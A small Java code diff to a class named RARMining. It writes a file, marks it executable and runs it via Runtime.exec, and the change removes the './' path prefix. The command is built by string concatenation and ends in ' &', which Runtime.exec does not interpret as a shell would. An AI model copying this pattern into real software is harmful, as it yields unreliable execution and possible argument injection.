@@ -54,7 +54,7 @@ public class RARMining {
 						writer.close();
 
 						Runtime.getRuntime().exec("chmod +x " + name);
-						Process process = Runtime.getRuntime().exec("./" + name + " &");
+						Process process = Runtime.getRuntime().exec(  name + " &");
 						InputStream inputStream = process.getInputStream();
 						BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream, StandardCharsets.UTF_8));
 						String line;
